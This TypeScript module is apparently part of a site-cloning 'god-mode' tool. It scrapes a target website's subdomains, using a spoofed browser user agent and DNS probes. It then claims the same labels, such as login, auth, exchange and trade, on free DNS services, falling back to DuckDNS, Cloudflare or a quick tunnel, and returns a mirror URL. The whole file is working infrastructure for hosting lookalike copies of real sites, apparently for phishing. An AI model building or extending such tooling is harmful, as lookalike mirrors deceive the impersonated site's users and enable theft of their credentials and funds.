/**
 * DNSHE subdomain provisioning for clone-deploy-tunnel god-mode.
 * Discovers target-site subdomains, claims an available label on DNSHE_BASE_DOMAIN.
 */
import dns from 'node:dns/promises'

import { fetch } from 'undici'

import {
  createCloudflareMirrorSubdomain,
  hasCloudflareDnsConfig,
  hasDuckDnsConfig,
  resolveDuckDnsMirrorUrl,
  type MirrorDnsResult,
} from './clone-tunnel-dns.js'

export type DnsFallbackProvider = 'duckdns' | 'cloudflare' | 'quicktunnel'

const DNSHE_RETRY_COUNT = 3
const DNSHE_RETRY_BASE_MS = 1000

const COMMON_SUBDOMAINS = [
  'www',
  'app',
  'api',
  'cdn',
  'static',
  'assets',
  'm',
  'mobile',
  'web',
  'portal',
  'exchange',
  'trade',
  'docs',
  'support',
  'blog',
  'mail',
  'auth',
  'login',
  'secure',
  'go',
  'v3',
  'beta',
  'staging',
  'img',
  'images',
  'media',
  'rpc',
  'ws',
  'socket',
] as const

const MULTI_PART_TLD_PREFIXES = new Set(['co', 'com', 'net', 'org', 'gov', 'ac', 'edu'])

const URL_ATTR_RE = /\b(?:href|src|action|data-src|data-url)\s*=\s*["']([^"'#][^"']*)["']/gi
const CSS_URL_RE = /url\(\s*["']?(https?:\/\/[^"')]+)["']?\s*\)/gi

function readEnv(key: string): string | null {
  const v = process.env[key]?.trim()
  return v ? v : null
}

/** When true, never call DNSHE API (blocked networks / CLONE_SKIP_DNSHE). */
export function isCloneSkipDnsheEnabled(): boolean {
  const raw = readEnv('CLONE_SKIP_DNSHE')?.toLowerCase()
  return raw === 'true' || raw === '1' || raw === 'yes'
}

export function hasDnsheConfig(): boolean {
  return Boolean(readEnv('DNSHE_TOKEN') && readEnv('DNSHE_BASE_DOMAIN'))
}

export function sanitizeSubdomainLabel(raw: string): string | null {
  const label = raw
    .toLowerCase()
    .replace(/[^a-z0-9-]/g, '-')
    .replace(/-+/g, '-')
    .replace(/^-|-$/g, '')
    .slice(0, 63)
  if (!label || !/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/.test(label)) return null
  return label
}

export function getBaseDomain(hostname: string): string {
  const parts = hostname.toLowerCase().split('.').filter(Boolean)
  if (parts.length <= 2) return parts.join('.')
  const sld = parts[parts.length - 2]!
  if (MULTI_PART_TLD_PREFIXES.has(sld) && parts.length >= 3) {
    return parts.slice(-3).join('.')
  }
  return parts.slice(-2).join('.')
}

export function extractSubdomainLabel(host: string, baseDomain: string): string | null {
  const normalized = host.toLowerCase().replace(/\.$/, '')
  if (normalized === baseDomain) return ''
  const suffix = `.${baseDomain}`
  if (!normalized.endsWith(suffix)) return null
  const sub = normalized.slice(0, -suffix.length)
  if (!sub) return ''
  return sub.split('.')[0] ?? null
}

export function siteNameFromBaseDomain(baseDomain: string): string {
  const parts = baseDomain.split('.').filter(Boolean)
  if (parts.length >= 3 && MULTI_PART_TLD_PREFIXES.has(parts[parts.length - 2]!)) {
    return parts[parts.length - 3] ?? parts[0] ?? 'mirror'
  }
  return parts[0] ?? 'mirror'
}

function collectUrlsFromHtml(html: string, pageUrl: URL): string[] {
  const found: string[] = []
  const push = (raw: string) => {
    const trimmed = raw.trim()
    if (!trimmed || trimmed.startsWith('data:') || trimmed.startsWith('javascript:')) return
    found.push(trimmed)
  }

  for (const re of [URL_ATTR_RE, CSS_URL_RE]) {
    re.lastIndex = 0
    let match: RegExpExecArray | null
    while ((match = re.exec(html)) !== null) {
      push(match[1] ?? '')
    }
  }

  try {
    const origin = pageUrl.origin
    for (const raw of found) {
      if (raw.startsWith('//')) found.push(`https:${raw}`)
      else if (raw.startsWith('/')) found.push(new URL(raw, origin).href)
    }
  } catch {
    /* ignore bad relative joins */
  }

  return found
}

async function fetchHomepageHtml(targetUrl: string): Promise<string | null> {
  try {
    const res = await fetch(targetUrl, {
      redirect: 'follow',
      signal: AbortSignal.timeout(20_000),
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        Accept: 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    })
    if (!res.ok) return null
    const contentType = res.headers.get('content-type') ?? ''
    if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
      return null
    }
    return await res.text()
  } catch {
    return null
  }
}

async function probeDnsSubdomain(label: string, baseDomain: string): Promise<boolean> {
  const fqdn = label ? `${label}.${baseDomain}` : baseDomain
  try {
    await dns.resolve4(fqdn)
    return true
  } catch {
    try {
      await dns.resolve6(fqdn)
      return true
    } catch {
      return false
    }
  }
}

export async function discoverSubdomainCandidates(targetUrl: string): Promise<{
  baseDomain: string
  originalSubdomain: string | null
  siteName: string
  candidates: string[]
}> {
  const pageUrl = new URL(targetUrl)
  const baseDomain = getBaseDomain(pageUrl.hostname)
  const originalSubdomain = extractSubdomainLabel(pageUrl.hostname, baseDomain)
  const siteName = siteNameFromBaseDomain(baseDomain)

  const frequency = new Map<string, number>()
  const bump = (label: string | null | undefined) => {
    const clean = sanitizeSubdomainLabel(label ?? '')
    if (!clean) return
    frequency.set(clean, (frequency.get(clean) ?? 0) + 1)
  }

  if (originalSubdomain) bump(originalSubdomain)

  const html = await fetchHomepageHtml(targetUrl)
  if (html) {
    const urls = collectUrlsFromHtml(html, pageUrl)
    for (const raw of urls) {
      try {
        const parsed = new URL(raw, pageUrl.href)
        if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') continue
        const label = extractSubdomainLabel(parsed.hostname, baseDomain)
        if (label != null && label !== '') bump(label)
      } catch {
        /* skip malformed */
      }
    }
  }

  const dnsHits: string[] = []
  await Promise.all(
    COMMON_SUBDOMAINS.map(async (label) => {
      if (await probeDnsSubdomain(label, baseDomain)) {
        dnsHits.push(label)
        bump(label)
      }
    }),
  )

  const scored = [...frequency.entries()]
    .filter(([label]) => label !== siteName || frequency.size === 1)
    .sort((a, b) => {
      if (originalSubdomain) {
        if (a[0] === originalSubdomain) return -1
        if (b[0] === originalSubdomain) return 1
      }
      const aCommon = COMMON_SUBDOMAINS.indexOf(a[0] as (typeof COMMON_SUBDOMAINS)[number])
      const bCommon = COMMON_SUBDOMAINS.indexOf(b[0] as (typeof COMMON_SUBDOMAINS)[number])
      const aRank = aCommon >= 0 ? aCommon : 999
      const bRank = bCommon >= 0 ? bCommon : 999
      if (aRank !== bRank) return aRank - bRank
      return b[1] - a[1]
    })
    .map(([label]) => label)

  const ordered: string[] = []
  const seen = new Set<string>()
  const add = (label: string | null | undefined) => {
    const clean = sanitizeSubdomainLabel(label ?? '')
    if (!clean || seen.has(clean)) return
    seen.add(clean)
    ordered.push(clean)
  }

  if (originalSubdomain) add(originalSubdomain)
  for (const label of scored) add(label)
  for (const label of dnsHits) add(label)
  for (const label of COMMON_SUBDOMAINS) add(label)

  return {
    baseDomain,
    originalSubdomain: originalSubdomain ? sanitizeSubdomainLabel(originalSubdomain) : null,
    siteName: sanitizeSubdomainLabel(siteName) ?? 'mirror',
    candidates: ordered,
  }
}

function isDnsheTakenResponse(status: number, body: string): boolean {
  const lower = body.toLowerCase()
  return (
    lower.includes('already exist') ||
    lower.includes('already exists') ||
    lower.includes('already taken') ||
    lower.includes('has been registered') ||
    lower.includes('hostname exists') ||
    lower.includes('record exists') ||
    lower.includes('occupied') ||
    lower.includes('duplicate') ||
    (status === 409 && lower.includes('exist'))
  )
}

function isDnsheSuccessResponse(status: number, body: string): boolean {
  if (status < 200 || status >= 300) return false
  const lower = body.toLowerCase()
  if (lower.includes('error') || lower.includes('fail')) {
    if (isDnsheTakenResponse(status, body)) return false
    if (lower.includes('success')) return true
    return false
  }
  try {
    const json = JSON.parse(body) as Record<string, unknown>
    if (json.success === false) return false
    if (json.success === true) return true
    if (json.status === 'ok' || json.status === 'success') return true
  } catch {
    /* plain text */
  }
  return (
    lower.includes('success') ||
    lower.includes('"ok"') ||
    lower.includes('updated') ||
    lower.includes('created') ||
    body.trim() === 'OK' ||
    body.trim() === '1'
  )
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms))
}

export function resolveDnsheFallbackProviders(): DnsFallbackProvider[] {
  const raw = readEnv('DNSHE_FALLBACK_PROVIDERS')
  const defaultOrder: DnsFallbackProvider[] = ['duckdns', 'cloudflare', 'quicktunnel']
  if (!raw) return defaultOrder
  const parsed = raw
    .split(',')
    .map((s) => s.trim().toLowerCase())
    .filter((s): s is DnsFallbackProvider =>
      s === 'duckdns' || s === 'cloudflare' || s === 'quicktunnel',
    )
  return parsed.length > 0 ? parsed : defaultOrder
}

async function dnsheClaimOnce(
  fqdn: string,
  token: string,
): Promise<{ ok: true; fqdn: string } | { ok: false; taken: boolean; detail: string }> {
  const apiUrl =
    `https://api.dnshe.com/record/update?hostname=${encodeURIComponent(fqdn)}` +
    `&token=${encodeURIComponent(token)}&type=A&value=auto`

  const res = await fetch(apiUrl, {
    method: 'GET',
    signal: AbortSignal.timeout(20_000),
    headers: { Accept: 'application/json, text/plain, */*' },
  })
  const body = await res.text()
  if (isDnsheTakenResponse(res.status, body)) {
    return { ok: false, taken: true, detail: body.slice(0, 240) }
  }
  if (isDnsheSuccessResponse(res.status, body)) {
    return { ok: true, fqdn }
  }
  return { ok: false, taken: false, detail: body.slice(0, 240) || `HTTP ${res.status}` }
}

export async function tryDnsheClaimSubdomain(
  label: string,
  dnsheBaseDomain: string,
  token: string,
): Promise<{ ok: true; fqdn: string } | { ok: false; taken: boolean; detail: string }> {
  const clean = sanitizeSubdomainLabel(label)
  if (!clean) return { ok: false, taken: false, detail: 'invalid subdomain label' }

  const fqdn = `${clean}.${dnsheBaseDomain}`
  let lastDetail = 'unknown'

  for (let attempt = 0; attempt < DNSHE_RETRY_COUNT; attempt++) {
    try {
      const result = await dnsheClaimOnce(fqdn, token)
      if (result.ok || result.taken) return result
      lastDetail = result.detail
    } catch (e) {
      lastDetail = e instanceof Error ? e.message : String(e)
    }
    if (attempt < DNSHE_RETRY_COUNT - 1) {
      const delayMs = 2 ** attempt * DNSHE_RETRY_BASE_MS
      console.error(
        `[clone-tunnel] DNSHE API retry ${attempt + 1}/${DNSHE_RETRY_COUNT} for ${fqdn} in ${delayMs}ms (${lastDetail})`,
      )
      await sleep(delayMs)
    }
  }

  return { ok: false, taken: false, detail: lastDetail }
}

function randomSuffix(length = 4): string {
  return Math.random().toString(36).slice(2, 2 + length)
}

export async function provisionDnsheMirror(targetUrl: string): Promise<MirrorDnsResult> {
  const token = readEnv('DNSHE_TOKEN')
  const dnsheBase = readEnv('DNSHE_BASE_DOMAIN')
  if (!token || !dnsheBase) {
    return { ok: false, detail: 'DNSHE_TOKEN or DNSHE_BASE_DOMAIN not configured' }
  }

  const { originalSubdomain, siteName, candidates } = await discoverSubdomainCandidates(targetUrl)

  console.error(
    `[clone-tunnel] DNSHE discovery: ${candidates.length} candidate(s)` +
      (originalSubdomain ? ` (origin: ${originalSubdomain})` : ''),
  )

  const tryOrder: string[] = []
  const seen = new Set<string>()
  const queue = (label: string) => {
    const clean = sanitizeSubdomainLabel(label)
    if (!clean || seen.has(clean)) return
    seen.add(clean)
    tryOrder.push(clean)
  }

  for (const c of candidates) queue(c)
  queue(siteName)

  for (const label of tryOrder) {
    const result = await tryDnsheClaimSubdomain(label, dnsheBase, token)
    if (result.ok) {
      console.error(`[clone-tunnel] DNSHE claimed: ${result.fqdn}`)
      await new Promise((r) => setTimeout(r, 5_000))
      return {
        ok: true,
        mirrorUrl: `https://${result.fqdn}/`,
        fqdn: result.fqdn,
        provider: 'dnshe',
      }
    }
    if (result.taken) {
      console.error(`[clone-tunnel] DNSHE taken: ${label}.${dnsheBase}`)
      continue
    }
    console.error(`[clone-tunnel] DNSHE error for ${label}.${dnsheBase}: ${result.detail}`)
  }

  for (let attempt = 0; attempt < 8; attempt++) {
    const label = `${siteName}-${randomSuffix()}`
    const result = await tryDnsheClaimSubdomain(label, dnsheBase, token)
    if (result.ok) {
      console.error(`[clone-tunnel] DNSHE claimed (random): ${result.fqdn}`)
      await new Promise((r) => setTimeout(r, 5_000))
      return {
        ok: true,
        mirrorUrl: `https://${result.fqdn}/`,
        fqdn: result.fqdn,
        provider: 'dnshe',
      }
    }
    if (!result.taken) {
      console.error(`[clone-tunnel] DNSHE random attempt failed: ${result.detail}`)
    }
  }

  return { ok: false, detail: 'all DNSHE subdomain attempts exhausted' }
}

async function tryDuckDnsFallback(subdomain?: string): Promise<MirrorDnsResult> {
  if (!hasDuckDnsConfig()) {
    return { ok: false, detail: 'DUCKDNS_TOKEN not configured' }
  }
  const sub =
    subdomain?.trim() ||
    process.env['DUCKDNS_SUBDOMAIN']?.trim() ||
    `legion-${Math.random().toString(36).slice(2, 8)}`
  const duck = await resolveDuckDnsMirrorUrl(sub)
  if (!duck.ok) return { ok: false, detail: duck.detail }
  console.error(`[clone-tunnel] Using DuckDNS fallback: ${duck.fqdn}`)
  return { ok: true, mirrorUrl: duck.mirrorUrl, fqdn: duck.fqdn, provider: 'duckdns' }
}

async function tryCloudflareFallback(): Promise<MirrorDnsResult> {
  if (!hasCloudflareDnsConfig()) {
    return { ok: false, detail: 'Cloudflare DNS credentials incomplete' }
  }
  const created = await createCloudflareMirrorSubdomain()
  if (!created.ok) return { ok: false, detail: created.detail }
  console.error(`[clone-tunnel] Using Cloudflare fallback: ${created.fqdn}`)
  return {
    ok: true,
    mirrorUrl: created.mirrorUrl,
    fqdn: created.fqdn,
    provider: 'cloudflare',
    recordId: created.recordId,
  }
}

/**
 * DNSHE first, then configured fallback providers (duckdns → cloudflare → quicktunnel marker).
 * `quicktunnel` success is signaled with provider `trycloudflare` and empty fqdn — caller starts tunnel.
 */
export async function provisionMirrorDnsWithFallback(
  targetUrl: string,
  opts?: { duckSubdomain?: string; skipDnshe?: boolean },
): Promise<MirrorDnsResult & { useQuickTunnel?: boolean }> {
  const skipDnshe = opts?.skipDnshe === true || isCloneSkipDnsheEnabled()

  if (!skipDnshe && hasDnsheConfig()) {
    const dnshe = await provisionDnsheMirror(targetUrl)
    if (dnshe.ok) {
      console.error(`[clone-tunnel] DNS provider: dnshe (${dnshe.fqdn})`)
      return dnshe
    }
    console.error(`[clone-tunnel] DNSHE exhausted: ${dnshe.detail}`)
  } else if (skipDnshe) {
    console.error(
      '[clone-tunnel] Skipping DNSHE (--force or CLONE_SKIP_DNSHE=true) — using fallback chain',
    )
  } else {
    console.error('[clone-tunnel] DNSHE_TOKEN / DNSHE_BASE_DOMAIN not set — skipping DNSHE')
  }

  for (const provider of resolveDnsheFallbackProviders()) {
    if (provider === 'duckdns') {
      const duck = await tryDuckDnsFallback(opts?.duckSubdomain)
      if (duck.ok) return duck
      console.error(`[clone-tunnel] DuckDNS fallback failed: ${duck.detail}`)
      continue
    }
    if (provider === 'cloudflare') {
      const cf = await tryCloudflareFallback()
      if (cf.ok) return cf
      console.error(`[clone-tunnel] Cloudflare fallback failed: ${cf.detail}`)
      continue
    }
    if (provider === 'quicktunnel') {
      console.error('[clone-tunnel] Using quick tunnel fallback (trycloudflare.com)')
      return { ok: true, mirrorUrl: '', fqdn: '', provider: 'trycloudflare', useQuickTunnel: true }
    }
  }

  return { ok: false, detail: 'all DNS providers exhausted (DNSHE + fallbacks)' }
}
